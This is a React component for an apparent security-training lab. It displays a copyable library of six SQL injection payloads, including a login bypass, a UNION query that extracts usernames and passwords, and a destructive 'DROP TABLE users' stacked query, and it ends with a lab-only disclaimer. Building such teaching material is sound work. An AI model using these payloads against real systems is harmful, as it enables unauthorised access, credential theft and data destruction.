
import React from 'react';
import { useNavigate, Link } from 'react-router-dom';
import { useAuth } from '../context/AuthContext';
import { LayoutDashboard, Search as SearchIcon, User, Shield, Terminal, Database, Copy, Check } from 'lucide-react';
import { motion } from 'framer-motion';

function SQLiTest() {
    const { user } = useAuth();
    const navigate = useNavigate();
    const [copiedIndex, setCopiedIndex] = React.useState(null);

    const payloads = [
        {
            title: "Authentication Bypass",
            description: "Log in without a password by tricking the logic.",
            code: "' OR '1'='1",
            context: "Login Form (Username or Password)"
        },
        {
            title: "Extract All Data (Union-Based)",
            description: "Combine results from the original query with results from a injected query.",
            code: "' UNION SELECT 1, username, password, sensitive_note, 'role' FROM users--",
            context: "Search Field"
        },
        {
            title: "Comment Truncation",
            description: "Ignore the rest of the original query.",
            code: "admin' --",
            context: "Login Form (Username)"
        },
        {
            title: "Wildcard Abuse",
            description: "Retrieve all records using the LIKE operator wildcard.",
            code: "%",
            context: "Search Field"
        },
        {
            title: "Error Based Reconnaissance",
            description: "Trigger a database error to reveal information about the backend.",
            code: "'",
            context: "Any Input"
        },
        {
            title: "Stacked Queries (Destructive)",
            description: "Execute a second separate query. DANGEROUS.",
            code: "'; DROP TABLE users; --",
            context: "Input allowing stacked queries (PostgreSQL often supports this)"
        }
    ];

    const handleCopy = (text, idx) => {
        navigator.clipboard.writeText(text);
        setCopiedIndex(idx);
        setTimeout(() => setCopiedIndex(null), 2000);
    };

    return (
        <div className="min-h-screen bg-cyber-black text-cyber-light font-sans flex text-sm">
            {/* Sidebar */}
            <aside className="w-16 lg:w-64 bg-cyber-dark border-r border-gray-800 flex flex-col shrink-0">
                <div className="p-4 lg:p-6 border-b border-gray-800 flex items-center justify-center lg:justify-start gap-3">
                    <Shield className="w-8 h-8 text-cyber-primary" />
                    <span className="hidden lg:block text-xl font-bold text-white tracking-tight">Secure<span className="text-cyber-primary">Defense</span></span>
                </div>
                <nav className="flex-1 p-2 space-y-2">
                    <Link to="/dashboard" className="flex items-center gap-3 px-3 py-3 rounded-lg text-gray-400 hover:text-white hover:bg-white/5 justify-center lg:justify-start">
                        <LayoutDashboard size={20} /> <span className="hidden lg:block">Overview</span>
                    </Link>
                    <Link to="/search" className="flex items-center gap-3 px-3 py-3 rounded-lg text-gray-400 hover:text-white hover:bg-white/5 justify-center lg:justify-start">
                        <SearchIcon size={20} /> <span className="hidden lg:block">Search Users</span>
                    </Link>
                    <Link to="/sqli-test" className="flex items-center gap-3 px-3 py-3 rounded-lg bg-cyber-primary/10 text-cyber-primary border border-cyber-primary/20 justify-center lg:justify-start">
                        <Database size={20} /> <span className="hidden lg:block">SQLi Test</span>
                    </Link>
                    <Link to="/profile" className="flex items-center gap-3 px-3 py-3 rounded-lg text-gray-400 hover:text-white hover:bg-white/5 justify-center lg:justify-start">
                        <User size={20} /> <span className="hidden lg:block">My Profile</span>
                    </Link>
                </nav>
            </aside>

            {/* Main Content */}
            <main className="flex-1 overflow-y-auto relative flex flex-col h-screen">
                <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-cyber-primary via-blue-500 to-purple-500"></div>

                <div className="p-6 lg:p-10 max-w-6xl mx-auto w-full flex-1 flex flex-col">
                    <header className="mb-8">
                        <h1 className="text-3xl font-bold text-white mb-2">SQL Injection Payload Library</h1>
                        <p className="text-gray-400">Educational resources for testing system defenses.</p>
                    </header>

                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                        {payloads.map((item, idx) => (
                            <motion.div
                                key={idx}
                                initial={{ opacity: 0, y: 20 }}
                                animate={{ opacity: 1, y: 0 }}
                                transition={{ delay: idx * 0.1 }}
                                className="bg-cyber-dark border border-gray-800 rounded-xl p-6 group hover:border-cyber-primary/50 transition-colors"
                            >
                                <div className="flex justify-between items-start mb-4">
                                    <h3 className="text-lg font-bold text-white">{item.title}</h3>
                                    <span className="text-xs font-mono text-gray-500 bg-gray-900 px-2 py-1 rounded border border-gray-800">
                                        {item.context}
                                    </span>
                                </div>

                                <p className="text-gray-400 text-sm mb-4 h-10">{item.description}</p>

                                <div className="bg-black p-3 rounded-lg border border-gray-800 relative group-hover:border-cyber-primary/30 transition-colors">
                                    <code className="text-cyber-primary font-mono text-sm break-all">{item.code}</code>
                                    <button
                                        onClick={() => handleCopy(item.code, idx)}
                                        className="absolute top-2 right-2 p-1.5 bg-gray-800 text-gray-400 rounded hover:text-white hover:bg-gray-700 transition-colors"
                                        title="Copy Payload"
                                    >
                                        {copiedIndex === idx ? <Check size={14} className="text-green-500" /> : <Copy size={14} />}
                                    </button>
                                </div>
                            </motion.div>
                        ))}
                    </div>

                    <div className="mt-8 p-4 bg-yellow-500/10 border border-yellow-500/20 text-yellow-500 rounded-lg text-sm flex gap-3 items-start">
                        <Terminal className="shrink-0 mt-0.5" size={18} />
                        <div>
                            <strong>Disclaimer:</strong> These payloads are for educational and testing purposes within this lab environment only.
                            The Vulnerable App (v-app) is designed to be susceptible to these attacks. The Secure App (s-app) should block them.
                        </div>
                    </div>

                </div>
            </main>
        </div>
    );
}

export default SQLiTest;
